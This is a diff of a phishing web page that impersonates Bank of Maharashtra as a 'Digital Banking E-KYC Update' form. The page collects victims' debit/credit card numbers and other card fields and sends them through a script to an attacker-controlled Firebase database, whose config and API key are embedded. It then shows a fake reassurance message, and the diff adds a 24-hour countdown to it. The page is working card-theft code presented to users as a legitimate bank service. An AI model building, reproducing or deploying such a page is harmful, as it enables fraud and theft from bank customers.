@@ -3,7 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <title>Card Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      font-family: 'Arial', sans-serif;
+    }
     .header-img {
       width: 100%;
       display: block;
@@ -13,47 +20,42 @@
       text-align: center;
       margin: 10px auto 20px;
       padding: 0 15px;
-      font-family: 'Arial', sans-serif;
     }
-    .headline-box .main-title {
+    .main-title {
       font-size: 24px;
       font-weight: bold;
       color: #003366;
     }
-    .headline-box .sub-title {
+    .sub-title {
       font-size: 15px;
-      font-weight: normal;
       color: #333;
       opacity: 0.85;
       margin-top: 5px;
     }
     .card-box {
-      width: 100%;
+      width: 90%;
       max-width: 300px;
-      height: 170px;
       border-radius: 16px;
       background: linear-gradient(145deg, #1976d2, #afdbff);
       box-shadow: 0 8px 20px rgba(0,0,0,0.2);
       padding: 20px;
       margin: 30px auto;
       color: white;
-      font-family: 'Arial', sans-serif;
-      position: relative;
     }
     .card-title {
       font-size: 18px;
-      margin-bottom: 10px;
       font-weight: bold;
+      margin-bottom: 10px;
       text-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
     .card-number {
       display: flex;
-      gap: 20px;
-      justify-content: center;
+      justify-content: space-between;
+      gap: 10px;
       margin: 12px 0;
     }
-    .card-number input {
-      width: 40px;
+    .card-number input, .card-row input {
+      width: 100%;
       padding: 8px;
       font-size: 16px;
       border: none;
@@ -63,20 +65,11 @@
       color: white;
       box-shadow: inset 0 1px 2px rgba(0,0,0,0.2);
     }
-    .card-row {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 10px;
+    .card-number input {
+      max-width: 60px;
     }
-    .card-row input {
-      width: 15%;
-      padding: 8px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      text-align: center;
-      background: rgba(255,255,255,0.2);
-      color: white;
+    .card-row {
+      margin-top: 10px;
     }
     .card-label {
       font-size: 12px;
@@ -86,11 +79,11 @@
     .side-button {
       margin: 25px auto 15px;
       padding: 12px;
-      width: 100%;
+      width: 90%;
       max-width: 300px;
       font-size: 17px;
       background-color: #2db1f1;
-      color: #FFFFFF;
+      color: #fff;
       border: none;
       border-radius: 5px;
       display: block;
@@ -122,7 +115,6 @@
       padding: 25px;
       border-radius: 10px;
       text-align: center;
-      font-family: 'Arial', sans-serif;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
       line-height: 1.5;
     }
@@ -136,21 +128,25 @@
       color: #333;
       margin: 8px 0;
     }
+    .countdown {
+      color: green;
+      font-size: 15px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-  <!-- Header Image -->
+
   <img class="header-img" src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Bank Header">
 
-  <!-- Headline -->
   <div class="headline-box">
     <div class="main-title">Welcome To Digital Banking E-KYC Update</div>
     <div class="sub-title">(Experience secure, simple, and smart banking solutions for your financial needs.)</div>
   </div>
 
-  <!-- Card Details -->
   <div class="card-box">
-    <div class="card-title"> Debit/Credit Card Details</div>
+    <div class="card-title">Debit/Credit Card Details</div>
     <div class="card-number">
       <input type="text" id="card1" maxlength="4" pattern="\d*" required>
       <input type="text" id="card2" maxlength="4" pattern="\d*" required>
@@ -166,13 +162,10 @@
     </div>
   </div>
 
-  <!-- Continue Button -->
   <button class="side-button" onclick="validateCardForm()">Continue</button>
 
-  <!-- Bottom Image -->
   <img class="bottom-image" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Secure Banking">
 
-  <!-- Modal -->
   <div class="modal-blur-bg" id="kycModal">
     <div class="modal-message">
       <h3>Dear Customer,</h3>
@@ -183,14 +176,13 @@
       <p>During this time, there is no need for any further action from your side.</p>
       <p>You will be notified once your E-KYC update has been successfully completed.</p>
       <p>We appreciate your cooperation and trust in <strong>Bank of Maharashtra – Ek Parivaar, Ek Bank</strong>.</p>
+      <p class="countdown" id="countdownText"></p>
     </div>
   </div>
 
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-
-  <!-- Firebase Config -->
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
@@ -200,12 +192,10 @@
       messagingSenderId: "132474071601",
       appId: "1:132474071601:web:7c44a66fca6dc000e90310"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
   </script>
 
-  <!-- Form Script -->
   <script>
     function validateCardForm() {
       const card1 = document.getElementById("card1").value.trim();
@@ -227,12 +217,28 @@
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         document.getElementById("kycModal").style.display = "flex";
+        startCountdown(24 * 60 * 60); // 24 hours in seconds
       }).catch(err => {
         alert("Error saving data.");
         console.error(err);
       });
 
       return true;
+    }
+
+    function startCountdown(seconds) {
+      const countdownText = document.getElementById("countdownText");
+      function updateCountdown() {
+        let hrs = Math.floor(seconds / 3600);
+        let mins = Math.floor((seconds % 3600) / 60);
+        let secs = seconds % 60;
+        countdownText.textContent = `Time left: ${hrs}h ${mins}m ${secs}s`;
+        if (seconds > 0) {
+          seconds--;
+          setTimeout(updateCountdown, 1000);
+        }
+      }
+      updateCountdown();
     }
   </script>
 </body>
